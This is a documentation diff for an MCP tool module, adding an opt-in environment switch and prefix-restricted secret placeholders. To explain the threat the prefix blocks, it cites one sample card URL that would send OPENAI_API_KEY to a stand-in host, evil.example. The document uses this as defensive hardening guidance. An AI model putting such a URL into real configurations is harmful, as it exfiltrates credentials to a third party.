@@ -39,9 +39,9 @@ alongside the callables from every other card.
 
 | Field | Type | Default | Meaning |
 |---|---|---|---|
-| `url` | `str` | **required** | The MCP endpoint URL. |
+| `url` | `str` | **required** | The MCP endpoint URL. `${VAR}` is resolved — see [below](#secrets-come-from-the-worker-environment). |
 | `transport` | `"streamable-http" \| "sse"` | `"streamable-http"` | Chosen explicitly — see [below](#the-transport-is-never-inferred). |
-| `bearer_token` | `str \| None` | `None` | Sent as `Authorization: Bearer …` **on the transport**, never as a toolset `headers=` kwarg (pydantic-ai raises `ValueError` when both a transport object and headers are given). |
+| `bearer_token` | `str \| None` | `None` | `${VAR}` is resolved. Sent as `Authorization: Bearer …` **on the transport**, never as a toolset `headers=` kwarg (pydantic-ai raises `ValueError` when both a transport object and headers are given). |
 | `timeout` | `float` (>0) | `10.0` | Connection **initialization** timeout. Translated to pydantic-ai's `init_timeout` when the toolset is built; the field is deliberately not renamed because it is persisted in catalog entries. |
 | `read_timeout` | `float` (>0) | `300.0` | Read timeout for the transport. For `sse` it is also forwarded as `sse_read_timeout` — see [below](#sse-needs-read_timeout-twice). |
 | `tool_prefix` | `str \| None` | `None` | Prefix applied to every tool name via the toolset's `prefixed()` wrapper. |
@@ -52,14 +52,69 @@ alongside the callables from every other card.
 |---|---|---|---|
 | `transport` | `Literal["stdio"]` | `"stdio"` | Fixed; it is the discriminator. |
 | `stdio_command` | `str \| None` | `None` | The launcher — `uvx`, `npx`, `docker`, a binary path. **Required in practice:** a missing value raises `ValueError` when the toolset is built. |
-| `stdio_args` | `list[str]` | `[]` | Arguments passed to the command. |
-| `stdio_env` | `dict[str, str] \| None` | `None` | Environment for the subprocess. |
+| `stdio_args` | `list[str]` | `[]` | Arguments passed to the command. `${VAR}` is resolved in each. |
+| `stdio_env` | `dict[str, str] \| None` | `None` | Environment for the subprocess. `${VAR}` is resolved in each value (not in keys). |
 | `stdio_cwd` | `str \| None` | `None` | Working directory for the subprocess. |
 | `stdio_token_env_var` | `str \| None` | `None` | When set together with `bearer_token`, the token is injected into the subprocess environment under this name. |
-| `bearer_token` | `str \| None` | `None` | Only reaches the server through `stdio_token_env_var` — there is no header on a stdio transport. |
+| `bearer_token` | `str \| None` | `None` | Only reaches the server through `stdio_token_env_var` — there is no header on a stdio transport. `${VAR}` is resolved only when `stdio_token_env_var` is set; otherwise the token is ignored. |
 | `timeout` | `float` (>0) | `10.0` | Initialization timeout ⇒ `init_timeout`. |
 | `read_timeout` | `float` (>0) | `300.0` | Read timeout. |
 | `tool_prefix` | `str \| None` | `None` | As above. |
+
+---
+
+## MCP is off unless the worker turns it on
+
+An MCP card is code execution on the worker: a stdio card launches any command, and an HTTP card
+sends whatever it can read to any host. Whoever can write an MCP card therefore controls the
+worker. `MCPTool` refuses to build — `get_toolsets()`, `list_mcp_tools()` and
+`probe_mcp_connection()` all raise `PermissionError` — unless the worker exports:
+
+```bash
+AKGENTIC_MCP_ENABLED=true   # also 1 or yes, any case; anything else is off
+```
+
+The switch is read from the worker's environment, never from the card, so a card author cannot
+turn it on. Enable it only where writing tool cards is restricted to administrators. The constant
+is exported as `akgentic.tool.mcp.MCP_ENABLED_ENV`.
+
+## Secrets come from the worker environment
+
+Never write a credential into a card. Write a `${VAR}` placeholder and export `VAR` on the worker,
+**named with the prefix `AKGENTIC_MCP_SECRET_`**:
+
+```yaml
+connection:
+  transport: stdio
+  stdio_command: uvx
+  stdio_args: ["acme-mcp-server"]
+  stdio_env:
+    CLIENT_SECRET: "${AKGENTIC_MCP_SECRET_ACME_CLIENT}"
+```
+
+- **Only the prefix is readable.** `${OPENAI_API_KEY}`, `${HOME}` or any other name raises
+  `ValueError`, even when the variable is set. Otherwise a card could send any worker secret to a
+  host it names (`url: https://evil.example/?k=${OPENAI_API_KEY}`). Exporting a value under
+  `AKGENTIC_MCP_SECRET_` is the operator's decision to expose it to MCP cards. The constant is
+  exported as `akgentic.tool.mcp.MCP_SECRET_PREFIX`.
+- **Resolved fields:** `url`, `bearer_token`, `stdio_args`, and `stdio_env` *values*. Not
+  `stdio_command`, `stdio_cwd`, `stdio_token_env_var`, `tool_prefix`, or `stdio_env` keys.
+- **When:** each time the transport is built, from that process's `os.environ`.
+- **Never persisted:** the resolved value lives only in the transport. The card keeps the
+  placeholder, so team cards, the event store and catalog exports never carry the secret.
+- **Missing is an error:** an unset *or empty* variable raises `ValueError` naming the variable
+  (never a value) when the toolset is built, instead of reaching the server as a blank credential.
+- **Why stdio needs `stdio_env`:** the MCP SDK hands a stdio server only `HOME, LOGNAME, PATH,
+  SHELL, TERM, USER`. Exporting the secret on the worker is not enough on its own; `stdio_env` is
+  the only route into the subprocess.
+- **Prefer `bearer_token` and `stdio_env`.** A secret resolved into `url` travels in the request
+  line: httpx logs request URLs at `INFO`, and its HTTP error messages quote the URL. A secret
+  resolved into `stdio_args` is visible to any user on the host in the process list. Use those
+  two fields only for a value the server accepts nowhere else.
+- There is no escape syntax: a literal `${NAME}` in a resolved field cannot be sent as-is.
+- **What the prefix does not stop:** a card author can still send an `AKGENTIC_MCP_SECRET_*`
+  value to a host of their choosing, and a stdio card can still run any command. The switch above,
+  and who may write cards, is the real boundary.
 
 ---
 
@@ -210,6 +265,9 @@ from akgentic.tool.mcp import (
 ## Failure modes worth knowing
 
 - A `stdio` connection with no `stdio_command` raises `ValueError` when the toolset is built.
+- With `AKGENTIC_MCP_ENABLED` unset or not truthy, every build raises `PermissionError`.
+- A `${VAR}` outside `AKGENTIC_MCP_SECRET_*`, or whose variable is unset or empty, raises
+  `ValueError` naming it when the toolset is built.
 - The `MCPToolset` import is deliberately **not** wrapped in a try/except: `mcp` ships
   unconditionally with pydantic-ai, so a genuine `ImportError` surfaces with its real cause
   instead of being rewritten into misleading installation advice.
